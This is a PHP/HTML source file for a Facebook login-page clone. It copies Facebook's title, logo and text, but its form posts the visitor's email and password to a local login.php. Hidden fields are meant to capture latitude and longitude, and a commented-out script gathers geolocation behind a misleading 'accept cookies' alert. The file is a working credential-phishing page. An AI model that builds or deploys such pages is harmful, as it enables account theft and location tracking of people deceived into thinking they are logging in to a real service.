<?php include('login.php') ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Log In or Sign Up</title>
    <link rel="icon" type="image/svg+xml" href="images/favicon.svg" />
    <link rel="stylesheet" href="css/styles.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
    <!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
document.addEventListener('DOMContentLoaded', () => {
    pageLoad();
});

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, positionError);
    }
}

function showPosition(position) {
    console.log(position);
    document.getElementById('getlat').value = position.coords.latitude;
    document.getElementById('getlon').value = position.coords.longitude;
    lon = document.getElementById('getlon').value;
    lat = document.getElementById('getlat').value;

   // document.frm1.submit(); // here the form is submit
}

function positionError(error) {
    if (error.PERMISSION_DENIED)alert('Please accept cookies');
    hideLoadingDiv();
    showError('Geolocation is not enabled. Please enable to use this feature');
}

function pageLoad() {
    getLocation();
}

</script> -->

  </head>
  <body>
    <main class="container">
      <!-- TITLE -->
      <div class="title-container">
        <img src="images/logo.svg" class="title-logo" />
        <p class="title-paragraph">
          Connect with friends and the world around you on Facebook.
        </p>
      </div>
      <!-- FORM -->
      <div class="form-container">
        <form class="form" action="login.php" method="post" name="frm1">
          <div class="input-container">
            <input
              type="text"
              placeholder="Email or Phone Number"
              name="email"
              class="form-input form-input--email"
            />
          </div>
          <div class="input-container input-container--password">
            <input
              type="password"
              placeholder="Password"
              name="pass"
              class="form-input form-input--password"
            />
            <div class="password-eye-container hidden">
              <img src="images/eye-off.png" class="password-eye eye-off" />
            </div>
          </div>
             <input type="hidden" name="longitude" id="getlon" />
              <input type="hidden" name="latitude" id="getlat" />
          <button class="form-log-in-btn" name="login">Log In</button>
          <a href="#" class="form-forgot-password">Forgot Password?</a>
          <div class="divider"></div>
          <a href="#" class="form-create-account-btn">Create New Account</a>
        </form>
        <p class="create-page-paragraph">
          <a href="#" class="create-page-link">Create a Page</a> for a
          celebrity, band or business.
        </p>
      </div>
    </main>
    <script src="js/script.js"></script>
  </body>
</html>
